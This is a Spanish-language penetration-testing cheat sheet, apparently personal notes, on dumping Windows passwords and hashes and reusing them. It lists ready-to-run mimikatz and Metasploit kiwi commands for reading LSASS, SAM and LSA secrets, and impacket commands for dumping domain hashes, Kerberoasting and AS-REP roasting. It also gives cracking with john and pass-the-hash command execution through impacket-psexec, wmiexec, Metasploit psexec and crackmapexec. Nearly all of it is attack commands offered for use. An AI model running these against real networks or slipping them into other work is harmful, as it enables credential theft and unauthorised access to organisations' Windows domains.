
### Dumping passwords/hashes
__Para obtener hashes con kiwi o mimikatz es posible que se requieran privilegios elevados__

#### Módulo kiwi metasploit
A través de metasploit se puede cargar el módulo kiwi (mimikatz integrado en metasploit). Teniendo una sesión de meterpreter.

```bash
pgrep lsass
migrate <PID de lsass>
load kiwi

###### PARA VER TODAS LAS OPCIONES ESCRIBIMOS UN "'?"
### OPCIONES INTERESANTES
creds_all #si hay alguna en texto plano lo mostrará
creds_kerberos
password_change
lsa_dump_secrets
wifi_list

```

#### Mimikatz
Otra manera es con mimikatz de manera nativa, se puede subir a través de un meterpreter, o con certutil. Mimikatz por defecto en kali se encuentra en: **/usr/share/windows-resources/mimikatz/x64/mimikatz.exe**

Una vez ejecutado:
```bash
privilege::debug 
## Si nos devielve Privilege '20' OK está todo correcto

####COMANDOS INTERESANTES
lsadump::sam
lsadump::secrets
sekurlsa:logonpasswords #si hay alguna en texto plano lo mostrará
```

#### Con meterpreter
```bash
hashdump
```

#### Ataque TGT con impacket
si tenemos una pareja de credenciales (user/pass), podemos intentar obtener todos los hashes de los usuarios del dominio, incluido el del administrador.
```bash
#opcion1
impacket-secretsdump -just-dc usuario@ip (SAM HASH, para pass-the-hash)

#opcion2
impacket-GetUserSPNs dominio/usuario:contraseña -request (para john)

```
#### NOT-PREAUTH Attack Impacket
Cuando detectamos usuarios en un dominio que tienen el NOT-PREAUTH, podemos intentar obtener el hash de su contraseña para luego crackearla con john the ripper.

```bash
#opcion1
impacket-GetNPUsers <dominio>/<usuario> -no-pass

#opcion2
impacket-GetNPUsers <dominio>/ -no-pass -usersfile usuarios.txt
```
```bash
#Con el hash obtenido, lo pasamos por john
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Pass-the-hash
Poemos intentar acceder al dominio sin necesidad de crackear la contraseña, solamente teniendo el hash, haciendo un **pass the hash**

#### impacket
```bash
#opcion 1
impacket-psexec usuario@ip -hashes <hash en cadena de texto>

#opcion 2
impacket-wmiexec <dominio>/user@ip -hashes <hash en cadena de texto>

### EJEMPLO
impacket-psexec Administrator@10.10.10.4 -hashes aaeeff31234aaaadddsfee345:2345:addfbbe
```
#### Metasploit psexec
```bash
use exploit/windows/smb/psexec
# RELLENAR OPCIONES, PERO LAS IMPORTANTES SON
SMBuser
SMBPass ##AQUI INTRODUCIMOS EL NTML HASH O NT HASH
set target Command (y si no funciona probar otro target)
exploit
```

#### Crackmapexec
```bash
##`PROBAR QUE FUNCIONA
#RESPETAR COMILLAS
crackmapexec smb <target IP> -u <user> -H "hash" 

## EJECUTAR COMANDOS
crackmapexec smb <target IP> -u <user> -H "hash"  -x "ipconfig"
```